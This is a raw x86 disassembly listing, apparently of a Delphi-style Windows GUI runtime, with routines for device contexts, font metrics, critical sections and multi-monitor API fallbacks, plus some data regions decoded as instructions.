push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42dc8e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_41dba4
pop edx
sub edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax esi
call sub_41ddd0
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_41ddd0
mov ax [ ebp - 0x8 ]
sub ax 0x2
jb r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_42dcb8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_428034
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42dc93
mov eax [ ebp - 0x4 ]
call sub_403390
call sub_403b84
call sub_403bd8
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42dcb8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42dcf8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] esi
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_42b5cc
mov eax [ ebx + 0x28 ]
call sub_42b5d0
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x28 ] eax
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42dd78
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_42db4c
mov eax [ ebx + 0x28 ]
mov ebx [ eax + 0xc ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax esi
call sub_41de08
pop esi
pop ebx
retn
sub_42ddc8
push ebx
push 0x0
call GetDC
mov ebx eax
push 0x5a
push ebx
call GetDeviceCaps
mov [ rw-data ] eax
push ebx
push 0x0
call ReleaseDC
mov eax rw-data
mov edx 0xf
call sub_428688
mov [ rw-data ] eax
pop ebx
retn
sub_42de00
push ebx
push esi
add esp 0xffffffc8
mov bl 0x1
push 0x0
call GetDC
mov esi eax
test esi esi
je r-xdata
mov eax ebx
add esp 0x38
pop esi
pop ebx
retn
mov eax [ rw-data ]
push eax
push esi
call SelectObject
test eax eax
je r-xdata
push esi
push 0x0
call ReleaseDC
push esp
push esi
call GetTextMetricsA
test eax eax
je r-xdata
mov bl [ esp + 0x34 ]
sub_42de44
push ebx
push esi
push edi
push 0x48
mov eax [ rw-data ]
push eax
push 0x8
call MulDiv
neg eax
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_42de00
mov ebx eax
mov eax ebx
sub al 0x80
jne r-xdata
mov esi r-xdata
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x48
mov eax [ rw-data ]
push eax
push 0x9
call MulDiv
neg eax
mov [ rw-data ] eax
mov [ rw-data ] bl
sub_42df10
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_42df48
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov eax esi
call sub_42e140
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_42df8c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_42df74
xor eax eax
push ebp
push sub_42e02d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e034
mov eax [ ebp - 0x4 ]
call sub_42df80
retn
mov eax 0x10
call sub_4027b4
mov [ ebp - 0x8 ] eax
mov edi [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ edi ] eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_42e040
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] esi
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp esi [ eax + 0xc ]
jne r-xdata
sub_42e040
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c074
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42e11f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x8 ]
call sub_42c63c
mov edi eax
mov eax [ edi + 0x14 ]
xor edx edx
call sub_427724
mov eax [ edi + 0x14 ]
mov edx ebx
call sub_427608
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_41a018
lea edx [ ebp - 0x18 ]
mov eax edi
call sub_4279ac
xor esi esi
mov edx ebx
and edx 0x80000001
jns r-xdata
dec eax
or eax 0xfffffffe
inc eax
cmp eax edx
jne r-xdata
dec edx
or edx 0xfffffffe
inc edx
inc ebx
cmp ebx 0x9
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov edx ebx
mov eax edi
call sub_427d08
mov eax esi
and eax 0x80000001
jns r-xdata
inc esi
cmp esi 0x9
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x8 ]
call sub_42c2f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42e140
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_42df74
xor eax eax
push ebp
push sub_42e18b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e192
mov eax [ ebp - 0x4 ]
call sub_42df80
retn
mov esp ebp
pop ebp
retn
sub_42e192
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_4027d4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
call sub_403390
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_42df74
xor eax eax
push ebp
push sub_42e18b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e192
mov eax [ ebp - 0x4 ]
call sub_42df80
retn
mov esp ebp
pop ebp
retn
sub_42e1b8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_42697c
push eax
mov eax ebx
call sub_42697c
mov edx eax
mov eax [ rw-data ]
pop ecx
call sub_42df8c
mov eax [ eax + 0x4 ]
pop esi
pop ebx
retn
sub_42e1f0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42e2b9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e2c0
retn
mov eax [ rw-data ]
call sub_403390
mov eax [ rw-data ]
call sub_403390
mov eax [ rw-data ]
call sub_403390
call sub_42b2b0
mov eax [ rw-data ]
call sub_403390
mov eax [ rw-data ]
call sub_403390
mov eax [ rw-data ]
call sub_403390
mov eax [ rw-data ]
call sub_403390
mov eax [ rw-data ]
call sub_403390
mov eax [ rw-data ]
push eax
call DeleteObject
push rw-data
call DeleteCriticalSection
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_404bd4
mov eax rw-data
mov ecx 0x34
mov edx [ r-xdata ]
call sub_404bd4
sub_42e2c4
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_42ddc8
push rw-data
call InitializeCriticalSection
push rw-data
call InitializeCriticalSection
push 0x7
call GetStockObject
mov [ rw-data ] eax
push 0x5
call GetStockObject
mov [ rw-data ] eax
push 0xd
call GetStockObject
mov [ rw-data ] eax
push 0x7f00
push 0x0
call LoadIconA
mov [ rw-data ] eax
call sub_42de44
mov cx 0x2c
mov dl 0x1
mov eax [ sub_4260c0 ]
call sub_426134
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ sub_4260c0 ]
call sub_426134
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ sub_4260c0 ]
call sub_426134
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42df10
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b8c0
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b8c0
mov [ rw-data ] eax
mov ecx sub_42698c
mov edx sub_42699c
mov eax [ r-xdata ]
call sub_41ae14
mov ecx r-xdata
mov edx sub_426ba4
mov eax [ r-xdata ]
call sub_41ae14
sub_42e3d0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42e3f5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e3fc
retn
sub_42e40c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0x42
add [ eax + eax ] dl
add [ eax ] al
fmul [ esi + 0x35d80041 ]
inc eax
add ah ah
xor eax 0x35e80040
inc eax
add ah ch
xor eax 0x35e00040
inc eax
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
fdiv [ ecx + eax * 2 + 0x41b67c00 ]
add [ eax + 0x2c0042e5 ] dl
mov ch 0x41
add [ eax + 0xb0041b5 ] ch
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + ecx * 2 + 0x69 ] si
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor ch ah
inc edx
mov esp 0x42e4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
in al 0x42
add [ eax ] cl
add [ eax ] al
add [ eax ] dh
adc [ eax ] eax
fdiv [ 0x35e40040 ]
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax ] bl
out 0x42 al
add [ eax + 0x5c00402b ] dl
out 0x42 al
add [ eax - 0x1a ] cl
inc edx
add [ esp + edx * 2 ] cl
dec edi
jb r-xdata
cli
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
arpl [ ebx - 0x70 ] bp
push esp
push ebx
je r-xdata
jb r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_41b8bc
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
add [ eax ] cl
add [ eax ] al
add [ eax - 0x1c ] dh
inc edx
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax ] bl
out 0x42 al
add [ esi + 0x42 ] bh
add [ esi + 0x42 ] bl
add [ eax - 0x1a ] cl
inc edx
add [ esi ] al
dec esp
imul esi [ ebx + 0x74 ] 0x2400408d
in eax 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
in eax 0x42
mov eax edi
call sub_403390
sub_42e538
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403360
mov [ esi + 0x10 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_42e590
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_41b8bc
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
mov eax edi
call sub_403390
sub_42e5d4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403360
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_42e618
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403390
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403380
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_42e65c
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_41b544
mov eax esi
pop esi
pop ebx
retn
sub_42e688
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42e6ad
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e6b4
retn
sub_42e6c8
cmp [ rw-data ] 0x0
jne r-xdata
retn
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_42e728
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_42e6c8
xor eax eax
jmp r-xdata
push ebx
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebx
retn
mov al 0x1
sub_42e818
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x1203
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42e854
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42e879
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e880
retn
sub_42e88c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4045d0
xor eax eax
push ebp
push sub_42e94b
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
xor eax eax
mov al bl
cmp [ eax + rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e952
lea eax [ ebp - 0x4 ]
call sub_404120
retn
cmp [ rw-data ] 0x0
je r-xdata
xor esi esi
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov esi edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4045e0
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov esi eax
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov al bl
mov [ eax + rw-data ] 0x1
mov [ rw-data ] 0x1
test esi esi
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_42e88c
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_404120
sub_42e974
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
or eax 0xffffffff
mov edx ebx
add edx 0xffffffb4
sub edx 0x2
jb r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
xor eax eax
call sub_42e88c
mov [ rw-data ] eax
push ebx
call [ rw-data ]
jmp r-xdata
xor eax eax
jmp r-xdata
je r-xdata
pop ebx
pop ebp
retn 0x4
cmp eax 0xffffffff
jne r-xdata
xor ebx ebx
jmp r-xdata
dec edx
je r-xdata
push ebx
call GetSystemMetrics
mov ebx 0x1
dec edx
sub edx 0x2
jae r-xdata
mov eax 0x1
jmp r-xdata
sub_42e9fc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor esi esi
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x2
call sub_42e88c
mov [ rw-data ] eax
push edi
push ebx
call [ rw-data ]
mov esi eax
jmp r-xdata
mov esi 0x12340042
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp [ ebx + 0xc ] 0x0
jle r-xdata
push 0x0
call [ rw-data ]
cmp eax [ ebx ]
jle r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebx + 0x4 ]
jle r-xdata
sub_42ea8c
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
and eax 0x3
test al al
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x1
call sub_42e88c
mov [ rw-data ] eax
push ebx
push esi
call [ rw-data ]
jmp r-xdata
push esi
call IsIconic
test eax eax
je r-xdata
mov eax 0x12340042
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetWindowPlacement
jmp r-xdata
push ebx
lea eax [ ebp - 0x10 ]
push eax
call sub_42e9fc
sub_42eb22
add [ eax ] al
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x3
call sub_42e88c
mov [ rw-data ] eax
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov ebx 0x12340042
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push 0x0
call [ rw-data ]
cmp esi eax
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jl r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_42eba3
call [ eax ]
add [ eax ] al
add [ ebp + 0x6f ] cl
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x6d6f7246
push eax
outsd
imul ebp [ esi + 0x74 ] 0x0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_42e88c
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_42ec90
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x5
call sub_42e88c
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_42ed64
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x6
call sub_42e88c
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_42ee38
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x7
call sub_42e88c
mov [ rw-data ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push edi
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
push 0x0
call [ rw-data ]
mov [ ebp - 0x14 ] eax
push 0x1
call [ rw-data ]
mov [ ebp - 0x10 ] eax
test esi esi
je r-xdata
test edi edi
je r-xdata
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetClipBox
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push esi
call GetDCOrgEx
test eax eax
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push esi
push 0x12340042
call [ ebp + 0x10 ]
mov ebx eax
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
neg eax
push eax
mov eax [ ebp - 0x8 ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x1
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_42efd3
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42eff9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f000
retn
sub_42f014
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42f039
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f040
retn
sub_42f0b8
mov esp 0xf0042f0
adc eax 0x65705349
arpl [ ecx + 0x61 ] bp
insb
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
je r-xdata
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
add [ edi ] cl
insd
dec eax
insb
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
outsb
je r-xdata
lodsd [ esi ]
imul esp [ ebp + 0x77 ] 0x11a47265
inc eax
add [ ecx ] al
xchg ebx eax
cld
add [ eax ] al
add [ eax ] al
add [ eax - 0xe ] bl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0xe ] ch
inc edx
add [ eax + eax ] cl
